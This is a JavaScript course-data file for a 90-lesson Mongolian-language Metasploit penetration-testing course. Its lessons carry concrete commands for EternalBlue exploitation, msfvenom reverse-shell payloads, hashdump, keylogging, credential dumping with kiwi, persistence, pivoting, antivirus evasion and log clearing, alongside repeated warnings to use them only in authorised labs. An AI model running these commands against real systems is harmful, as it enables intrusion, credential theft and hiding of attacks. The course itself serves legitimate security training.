/* metasploit — 90 хичээл (Анхан 30 · Дунд 30 · Ахлах 30) */
import { p, h, c, li, note, warn, L, buildCourse } from './_helpers.js';

const anhan = [
  L('Metasploit гэж юу вэ', 'Pentest фреймворкийн танилцуулга.', [
    p('Metasploit Framework нь exploit, payload, scanner-ийг нэг дороос удирддаг нэвтрэлтийн тестийн платформ.'),
    warn('Зөвхөн өөрийн лаб (Metasploitable, TryHackMe, HackTheBox) эсвэл зөвшөөрөлтэй системд. Бусад тохиолдолд гэмт хэрэг.'),
  ]),
  L('Үндсэн ойлголтууд', 'exploit, payload, module, session.', [
    li('exploit — сул талыг ашиглах код', 'payload — нэвтэрсний дараа ажиллах', 'module — бүрэлдэхүүн', 'session — холбогдсон суваг'),
  ]),
  L('Лаб бэлтгэх', 'Metasploitable суулгах.', [
    p('Metasploitable2/3 нь дадлагад зориулсан зориуд эмзэг виртуал машин. VM дотор тусгаарлаж ажиллуул.'),
  ]),
  L('Database init', 'msfdb тохируулах.', [
    c('sudo msfdb init'),
    note('Database нь скан үр дүн, host, service-ийг хадгална.'),
  ]),
  L('msfconsole эхлүүлэх', 'Үндсэн консол.', [
    c('msfconsole'),
    note('msf6 > мөрөнд командуудаа бичнэ.'),
  ]),
  L('help команд', 'Тусламж авах.', [
    c('help'),
    c('help search'),
  ]),
  L('version ба banner', 'Хувилбар шалгах.', [
    c('version'),
    c('banner'),
  ]),
  L('search — module хайх', 'Зөв module олох.', [
    c('search eternalblue'),
  ]),
  L('search шүүлтүүр', 'type, platform.', [
    c('search type:exploit platform:windows smb'),
  ]),
  L('use — module сонгох', 'Module идэвхжүүлэх.', [
    c('use exploit/windows/smb/ms17_010_eternalblue'),
  ]),
  L('info — мэдээлэл', 'Module-ийн дэлгэрэнгүй.', [
    c('info'),
    note('Module юу хийдэг, ямар target дэмждэгийг харуулна.'),
  ]),
  L('show options', 'Тохиргоо харах.', [
    c('show options'),
    note('Required: yes гэсэн утгуудыг заавал тавина.'),
  ]),
  L('set — утга тавих', 'RHOSTS тохируулах.', [
    c('set RHOSTS 192.168.1.110'),
  ]),
  L('RHOSTS ба LHOST', 'Зорилтот ба өөрийн хаяг.', [
    li('RHOSTS — зорилтот (remote)', 'LHOST — өөрийн (local)', 'RPORT/LPORT — портууд'),
  ]),
  L('unset ба setg', 'Утга цэвэрлэх, global.', [
    c('setg RHOSTS 192.168.1.110'),
    note('setg нь бүх module-д хадгалагдах global утга.'),
  ]),
  L('show payloads', 'Нийцэх payload-ууд.', [
    c('show payloads'),
  ]),
  L('payload сонгох', 'set PAYLOAD.', [
    c('set PAYLOAD windows/x64/meterpreter/reverse_tcp'),
  ]),
  L('check — шалгах', 'Эмзэг эсэхийг.', [
    c('check'),
    note('Зарим exploit нь халдахаас өмнө эмзэг эсэхийг шалгаж чадна.'),
  ]),
  L('exploit ажиллуулах', 'Халдлага эхлүүлэх.', [
    c('exploit'),
    note('run нь exploit-ийн нэр synonym.'),
  ]),
  L('session гэж юу вэ', 'Холбогдсон суваг.', [
    c('sessions -l'),
  ]),
  L('Meterpreter танилцуулга', 'Хүчирхэг payload.', [
    p('Meterpreter нь санах ойд ажилладаг, олон чадвартай дэвшилтэт payload.'),
  ]),
  L('sysinfo', 'Системийн мэдээлэл.', [
    c('sysinfo'),
  ]),
  L('getuid', 'Ямар эрхээр.', [
    c('getuid'),
  ]),
  L('Auxiliary module', 'Scanner, fuzzer.', [
    c('use auxiliary/scanner/portscan/tcp'),
    note('Auxiliary нь exploit биш — скан, мэдээлэл цуглуулах.'),
  ]),
  L('Port scanner module', 'MSF доторх скан.', [
    c('use auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.1.0/24\nrun'),
  ]),
  L('back ба exit', 'Module-аас гарах.', [
    c('back'),
    note('back нь module-аас гарна, exit нь msfconsole-оос.'),
  ]),
  L('db_nmap', 'MSF дотроос nmap.', [
    c('db_nmap -sV 192.168.1.110'),
    note('Үр дүн автоматаар database-д хадгалагдана.'),
  ]),
  L('hosts ба services', 'DB-ээс харах.', [
    c('hosts'),
    c('services'),
  ]),
  L('workspace', 'Төслүүдийг тусгаарлах.', [
    c('workspace -a project1'),
  ]),
  L('Анхан шатны давталт', 'search→use→set→exploit.', [
    li('search module хайх', 'use сонгох', 'show options / set', 'exploit'),
  ]),
];

const dund = [
  L('Reverse vs bind shell', 'Холболтын чиглэл.', [
    li('reverse — зорилт надруу холбогдоно (галт хана тойрно)', 'bind — би зорилт руу холбогдоно'),
  ]),
  L('Staged vs stageless', 'Payload бүтэц.', [
    li('staged (/) — жижиг эхлэл, дараа татна', 'stageless (_) — бүхэлдээ нэг дор'),
  ]),
  L('msfvenom танилцуулга', 'Бие даасан payload.', [
    c('msfvenom -l payloads | head'),
  ]),
  L('Linux payload', 'ELF үүсгэх.', [
    c('msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.105 LPORT=4444 -f elf -o shell.elf'),
  ]),
  L('Windows payload', 'EXE үүсгэх.', [
    c('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=4444 -f exe -o s.exe'),
  ]),
  L('Web payload', 'PHP/JSP.', [
    c('msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=4444 -f raw -o sh.php'),
  ]),
  L('multi/handler', 'Холболт хүлээн авах.', [
    c('use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.105\nrun'),
  ]),
  L('exploit -j', 'Арын дэвсгэрт.', [
    c('exploit -j'),
    note('-j нь job болгож арын дэвсгэрт ажиллуулна.'),
  ]),
  L('jobs', 'Ажиллаж буй handler.', [
    c('jobs -l'),
  ]),
  L('Meterpreter shell', 'Систем shell авах.', [
    c('shell'),
  ]),
  L('Файл татах/илгээх', 'download/upload.', [
    c('download /etc/passwd'),
    c('upload tool.sh /tmp/'),
  ]),
  L('Файлын систем', 'ls, cd, cat.', [
    c('ls'),
    c('cat /etc/passwd'),
  ]),
  L('hashdump', 'Нууц үгийн hash.', [
    c('hashdump'),
    warn('Зөвхөн зөвшөөрөлтэй тестэд. Олсон hash-ийг audit-д.'),
  ]),
  L('screenshot', 'Дэлгэцийн зураг.', [
    c('screenshot'),
  ]),
  L('keyscan', 'Гар чагнах.', [
    c('keyscan_start'),
    warn('Маш халдлагатай чадвар — зөвхөн зөвшөөрөлтэй тестэд.'),
  ]),
  L('getsystem', 'Эрх ахиулах.', [
    c('getsystem'),
    note('Windows дээр SYSTEM эрх авах оролдлого.'),
  ]),
  L('background', 'Session-ыг хадгалах.', [
    c('background'),
    c('sessions -i 1'),
  ]),
  L('migrate', 'Процесс шилжих.', [
    c('migrate -N explorer.exe'),
    note('Тогтвортой процесс руу шилжиж далдлана.'),
  ]),
  L('ps ба kill', 'Процесс удирдах.', [
    c('ps'),
    c('kill 1234'),
  ]),
  L('Post module', 'Нэвтэрсний дараа.', [
    c('run post/windows/gather/enum_logged_on_users'),
  ]),
  L('Local exploit suggester', 'Privesc санал.', [
    c('run post/multi/recon/local_exploit_suggester'),
  ]),
  L('route — pivoting', 'Дотоод сүлжээ.', [
    c('run autoroute -s 10.10.10.0/24'),
  ]),
  L('portfwd', 'Порт дамжуулах.', [
    c('portfwd add -l 3389 -p 3389 -r 10.10.10.5'),
  ]),
  L('resource script', 'Командыг автоматжуулах.', [
    c('msfconsole -r setup.rc'),
    note('.rc файлд командуудыг бичээд автоматаар ажиллуулна.'),
  ]),
  L('Encoder', 'AV тойрох (үндэс).', [
    c('msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=... -f exe'),
    note('Орчин үеийн AV-г encoder дангаар тойрдоггүй — зөвхөн ойлголтын төлөө.'),
  ]),
  L('Template ашиглах', 'Хууль ёсны файлд оруулах.', [
    c('msfvenom -p ... -x calc.exe -f exe -o evil.exe'),
  ]),
  L('db_import', 'Nmap XML оруулах.', [
    c('db_import scan.xml'),
  ]),
  L('loot ба creds', 'Цуглуулсан мэдээлэл.', [
    c('loot'),
    c('creds'),
  ]),
  L('vuln харах', 'DB дэх сул тал.', [
    c('vulns'),
  ]),
  L('Дунд шатны давталт', 'Payload, handler, post.', [
    li('msfvenom payload', 'multi/handler', 'meterpreter командууд', 'post module, pivoting'),
  ]),
];

const ahlah = [
  L('Бүрэн халдлагын урсгал', 'Recon→exploit→post.', [
    li('1. db_nmap скан', '2. service enumerate', '3. exploit сонгох', '4. session', '5. privesc', '6. pivot'),
  ]),
  L('Persistence', 'Тогтвортой нэвтрэлт.', [
    c('run persistence -X'),
    warn('Зөвшөөрөлтэй тестэд персистенс үлдээвэл заавал тайланд тэмдэглэж, дараа цэвэрлэнэ.'),
  ]),
  L('Privilege escalation', 'SYSTEM/root болох.', [
    c('run post/multi/recon/local_exploit_suggester'),
  ]),
  L('Token impersonation', 'incognito.', [
    c('load incognito\nlist_tokens -u'),
  ]),
  L('Pass the hash', 'Hash-аар нэвтрэх.', [
    c('use exploit/windows/smb/psexec\nset SMBPass <hash>'),
  ]),
  L('Mimikatz/kiwi', 'Credential гаргах.', [
    c('load kiwi\ncreds_all'),
    warn('Зөвхөн зөвшөөрөлтэй AD тестэд.'),
  ]),
  L('Pivoting гүнзгий', 'Олон шатлалт сүлжээ.', [
    c('run autoroute -s 10.10.20.0/24'),
    note('Эхний хостоор дамжуулан гүн дотоод сүлжээ рүү.'),
  ]),
  L('SOCKS proxy', 'Бусад хэрэгсэлд.', [
    c('use auxiliary/server/socks_proxy\nrun'),
    note('proxychains-аар nmap, browser-ийг pivot-аар дамжуулна.'),
  ]),
  L('Port forwarding гүнзгий', 'Үйлчилгээ нээх.', [
    c('portfwd add -l 8080 -p 80 -r 10.10.20.5'),
  ]),
  L('AV evasion', 'Илрэхээс зайлсхийх.', [
    p('Орчин үеийн AV-г тойроход encoder хангалтгүй. Custom loader, obfuscation, шинэ техник шаардана.'),
    warn('Зөвхөн зөвшөөрөлтэй red team дасгалд.'),
  ]),
  L('Custom payload', 'Захиалгат.', [
    c('msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... LPORT=443 -f exe'),
    note('HTTPS payload нь трафикт нийлж сайн далдлагдана.'),
  ]),
  L('Listener тогтворжуулах', 'Найдвартай холболт.', [
    c('set ExitOnSession false\nset SessionCommunicationTimeout 0'),
  ]),
  L('Web delivery', 'Хурдан payload түгээх.', [
    c('use exploit/multi/script/web_delivery'),
  ]),
  L('Client-side attack', 'Хэрэглэгчээр дамжих.', [
    c('use exploit/multi/fileformat/...'),
    warn('Фишинг/нийгмийн инженерчлэл зөвхөн зөвшөөрөлтэй scope-д.'),
  ]),
  L('Browser exploit', 'browser_autopwn.', [
    note('Хуучирсан browser-ийн сул талыг ашиглах — лаб орчинд судлах.'),
  ]),
  L('Database exploit', 'MySQL/MSSQL.', [
    c('use auxiliary/scanner/mysql/mysql_login'),
  ]),
  L('SMB relay', 'NTLM relay.', [
    note('NTLM нэвтрэлтийг өөр хост руу дамжуулах AD халдлага.'),
  ]),
  L('Post: enum gather', 'Мэдээлэл цуглуулах.', [
    c('run post/windows/gather/enum_applications'),
  ]),
  L('Post: data harvest', 'Файл, credential.', [
    c('run post/windows/gather/credentials/...'),
  ]),
  L('Clearev', 'Лог цэвэрлэх.', [
    c('clearev'),
    warn('Хууль ёсны тестэд лог УСТГАХГҮЙ — харин ч бүх үйлдлээ баримтжуулна. Энэ нь зөвхөн ойлголтын төлөө.'),
  ]),
  L('Anti-forensics ойлголт', 'Ул мөр.', [
    p('Халдагчийн ул мөр нуух техникийг ойлгох нь хамгаалагчид (blue team) илрүүлэхэд тусална.'),
  ]),
  L('Reporting', 'Олдвор баримтжуулах.', [
    li('Ашигласан exploit, payload', 'Нэвтэрсэн хост, авсан эрх', 'PoC дэлгэцийн зураг', 'Засах зөвлөмж'),
  ]),
  L('IOC үлдээхгүй байх', 'Цэвэр тест.', [
    note('Зөвшөөрөлтэй тестийн дараа байршуулсан payload, persistence-ийг бүгдийг цэвэрлэнэ.'),
  ]),
  L('Cobalt Strike-тай харьцуулах', 'Арилжааны хэрэгсэл.', [
    p('Cobalt Strike нь арилжааны red team платформ. Metasploit үнэгүй, нээлттэй хувилбар.'),
  ]),
  L('Empire/Sliver', 'Бусад C2.', [
    li('Sliver — орчин үеийн нээлттэй C2', 'Empire — PowerShell суурьтай'),
  ]),
  L('Module бичих', 'Ruby module.', [
    p('Metasploit module нь Ruby-ээр бичигдэнэ. Шинэ exploit-ийг framework-д нэмж болно.'),
  ]),
  L('CTF-д ашиглах', 'Бодит дадлага.', [
    p('HackTheBox/TryHackMe машинд Metasploit-ийг хариуцлагатай ашиглаж ур чадвараа сорь.'),
  ]),
  L('Хууль ба ёс зүй', 'Хязгаар.', [
    warn('Metasploit бол жинхэнэ зэвсэг. Зөвшөөрөлгүй ашиглах нь хүнд гэмт хэрэг. ROE-г чанд баримтал.'),
  ]),
  L('OPSEC', 'Болгоомжтой ажиллах.', [
    li('Чимээ багатай payload (https)', 'Шаардлагагүй module зайлсхийх', 'Бүх үйлдэл бүртгэх'),
  ]),
  L('Ахлах шатны дүгнэлт', 'Metasploit мастер зам.', [
    p('Та exploit, post-exploitation, pivoting, evasion-ийг судаллаа.'),
    note('Цааш: OSCP, AD халдлага, custom module, C2 framework.'),
  ]),
];

export const METASPLOIT90 = buildCourse('metasploit', 'metasploit', 'Нэвтрэлтийн тест · 90 хичээл', { anhan, dund, ahlah });
export default METASPLOIT90;
